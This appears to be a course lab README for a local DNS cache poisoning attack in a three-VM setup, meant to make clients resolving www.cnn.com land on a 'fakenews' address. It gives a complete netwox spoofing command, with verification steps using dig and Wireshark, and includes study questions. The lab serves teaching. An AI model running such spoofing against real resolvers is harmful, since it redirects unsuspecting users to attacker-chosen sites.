## Local DNS Cache Poisoning Attack

### Requirement

In this lab, you will poison the cache of a local DNS server, and thus affect clients who rely on this DNS server. More specifically, we want clients who access www.cnn.com go to fakenews.com.

### Setup

3 Linux VMs: Victim (DNS) Client, Victim (DNS) Server, Attacker.

The following is the IP addresses and MAC addresses for the VMs used in this README.

| VM  |  IP Address   |    Role       |
|-----|---------------|---------------|
| VM1 | 172.16.77.128 | victim client |
| VM2 | 172.16.77.129 | victim server |
| VM3 | 172.16.77.130 |   attacker    |

### Steps

1. On DNS Server machine: start the DNS Server. We will use BIND software. (BIND: Berkeley Internet Name Domain) 

```console
# sudo service bind9 start (If it's already running, then # sudo service bind9 restart)
```

2. On DNS Server: remove existing cache:

```console
# sudo rndc flush
```

3. On Victim Client, configure DNS server information, i.e., let the client know the IP address of the DNS server.

3.1. add this line to the end of file /etc/resolvconf/resolv.conf.d/head (remember to replace DNS_SERVER_IP with your Victim DNS server's IP address, plus, you need "sudo" if you edit the file using vi/vim.)

```console
nameserver DNS_SERVER_IP
```

3.2. run the following command so the above change will take effect:

```console
# sudo resolvconf -u
```

4. On Attacker VM, run

```console
# sudo netwox 105 --hostname "www.cnn.com" --hostnameip FAKENEWS.com_IP --authns "ns1.fastly.net" --authnsip ATTACKER_IP --filter "src host DNS_SERVER_IP" --ttl 19000 --spoofip raw
```

FAKENEWS.com IP address (as of today, 03/17/2022): 188.126.71.216 (you can use ping command to confirm it)

Explanation: '--spoofip raw' means to spoof at IP4/IP6 level, as opposed to spoof at the data link layer. In other words, spoof IP addresses, instead of spoof MAC addresses.

Question: why it's "src host DNS_SERVER_IP", instead of "src host DNS_CLIENT_IP"?

Question: does the ttl here have the same meaning as the ttl in IP headers?

5. on Victim Client, send a query.

```console
# dig www.cnn.com 
```

Note: if your dig command shows www.cnn.com is mapped to 188.126.71.216, then it means the attack is successful; if it's not mapped to this IP address, it means you're not on the right track.

6. Stop the attack - press control-c on the Attacker VM's terminal. On Victim Client, open wireshark and repeat step 5 (i.e. run the dig command again), from the packets captured in wireshark, confirm the attack is still successful, and the forged response is indeed from the Victim DNS server.

7. You are recommended to remove the line you added in step 3, in this file: /etc/resolvconf/resolv.conf.d/head, so that your future experiments won't be affected.
